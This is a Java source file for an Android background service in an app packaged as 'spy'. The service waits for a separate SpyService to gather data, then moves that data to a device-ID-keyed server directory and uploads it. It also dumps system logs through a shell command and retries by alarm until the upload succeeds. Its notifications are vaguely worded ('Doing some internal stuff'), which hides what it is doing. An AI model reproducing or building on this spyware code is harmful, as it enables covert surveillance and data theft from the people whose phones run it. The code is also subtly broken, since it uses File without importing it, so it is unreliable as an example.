package com.gameofcoding.spy.services;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import com.gameofcoding.spy.R;
import com.gameofcoding.spy.server.files.FileManager;
import com.gameofcoding.spy.server.files.ServerFiles;
import com.gameofcoding.spy.receivers.UploaderAlarmReceiver;
import com.gameofcoding.spy.server.Server;
import com.gameofcoding.spy.server.ServerManager;
import com.gameofcoding.spy.utils.NotificationUtils;
import com.gameofcoding.spy.utils.Utils;
import com.gameofcoding.spy.utils.XLog;
import java.util.concurrent.Executors;

public class UploaderService extends Service {
    private static final String TAG = "UploaderService";
    private static final int UPLOADER_SERVICE_NOTIF_ID = 1;
    private Context mContext;

    @Override
    public IBinder onBind(Intent intent) {return null;}

    @Override
    public void onCreate() {
	super.onCreate();
	XLog.v(TAG, "UploaderService has been started");
	mContext = getApplicationContext();
    }

    @Override
    public void onDestroy() {
	super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
	try {
	    Utils utils = new Utils(mContext);
	    if(utils.isServiceRunning(SpyService.class.getName())) {
		// Wait until uploader service is finished
		XLog.v(TAG, "SpyService is running, waiting until it finishes.");
		updateNotif("Waiting for updating of data...");
		while(utils.isServiceRunning(SpyService.class.getName()))
		    Thread.sleep(500);
		XLog.v(TAG, "SpyService finsihed, continuing work.");
	    }
	    XLog.v(TAG, "Starting data upload...");
	    updateNotif("Getting repo...");
	    Executors.newSingleThreadExecutor()
		.submit(dataUploader)
		.get();
	    XLog.i(TAG, "Saving logcats");
	    String out = Utils.shell("logcat -d > " + new File(getExternalCacheDir(), "logs.txt"));
	    XLog.i(TAG, "Command output: " + out);
	    XLog.i(TAG, "Logsaved");
	} catch(Exception e) {
	    XLog.e(TAG, "Exception occured while uploading data", e);
	} finally {
	    stopService();
	}
	// TODO:
	// 1: Check app update
	// 2: if(update) send update Notif
	// 3: Check if changes has been done
	// 5: if(Changes) Upload changes
	// 6: if(Changes & uploaded unsuccessfully) return error
	// 7: Pull new changes
	// 8: Goto 1 and 2
	// 9: If all went right then stop alarm

        return START_STICKY;
    }

    private void stopService() {
	// Stop service
	stopForeground(true);
	stopSelf();
    }


    @SuppressWarnings("deprecation")
    public void updateNotif(String contentText) {
	Notification.Builder notifBuilder = null;
	if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
	    NotificationUtils notifUtils = new NotificationUtils(mContext);
	    notifUtils.createDefaultNotifChannel();
	    String channelID = notifUtils.getDefaultNotifChannelId();
	    notifBuilder = new Notification.Builder(mContext, channelID);
	} else {
	    notifBuilder = new Notification.Builder(mContext);
	}

	// Start foreground notification
	notifBuilder.setContentTitle(getString(R.string.uploaderservice_notif_content_title))
	    .setContentText(contentText)
	    .setSmallIcon(R.mipmap.ic_launcher);
	startForeground(UPLOADER_SERVICE_NOTIF_ID, notifBuilder.build());
    }

    private Runnable dataUploader = new Runnable() {
	    @Override
	    public void run() {
		XLog.v(TAG, "Moving data...");
		updateNotif("Moving data...");
		FileManager fm = new FileManager(mContext);
		if(!fm.moveDataToServer()) {
		    XLog.i(TAG, "Data could not be moved from 'user_dir' to 'server_dir',"
			   + "we would try again later");
		    XLog.i(TAG, "Data not uploaded successfully, we would try again later");
		    return;
		} else
		    XLog.v(TAG, "Data movved");
		
		// Clean all previous data present in device dir
		ServerFiles serverFiles = ServerFiles.loadFiles(mContext);
		if(serverFiles == null) {
		    XLog.e(TAG, "Could not load server file paths, it is null (Aborting upload)");
		    XLog.i(TAG, "Data could not be moved from 'user_dir' to 'server_dir',"
			   + "we would try again later");
		    // Stop service
		    stopForeground(true);
		    stopSelf();
		    return;
		}
		ServerManager serverMaanager = new ServerManager(serverFiles.getRootDir(),
								 new Utils(mContext).generateDeviceId());
		Server server;
		boolean stopAlarm = true;
		try {
		    updateNotif("Doing some internal stuff");
		    XLog.i(TAG, "Loading server...");
		    if((server = serverMaanager.loadServer()) != null) {
			XLog.i(TAG, "Server loaded, opening device directory...");
			Server.Directory dirDevice = null;
			if((dirDevice = server.openDir(Server.Dir.DEVICE)) != null) {
			    XLog.i(TAG, "Device directory opened, preparing for upload");
			    if(dirDevice.uploadData())
				XLog.i(TAG, "Data uploaded successfully!");
			    else
				XLog.w(TAG, "Data could not be uploaded, aborting upload...");
			} else {
			    XLog.w(TAG, "Failed to open device directory in server! Aborting upload...");
			    stopAlarm = false;
			}
		    } else {
			XLog.w(TAG, "Aborting alarm. Server is null, it should'nt happen.");
			stopAlarm = false;
		    }
		} catch(Exception e) {
		    XLog.e(TAG, "Exception occured while working with server, aborting upload...", e);
		    stopAlarm = false;
		}

		if(stopAlarm) {
		    // Stopping alarm
		    XLog.i(TAG, "Uploaded and downloaded successfully!, stopping 'UploaderAlarmReceiver' alarm.");
		    AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
		    PendingIntent pendingIntent = PendingIntent
			.getBroadcast(mContext, 0, new Intent(mContext, UploaderAlarmReceiver.class), 0);
		    alarmManager.cancel(pendingIntent);
		} else {
		    // Wait for next time
		    XLog.i(TAG, "Data not uploaded successfully, we would try again later");
		}
	    }
	};
}
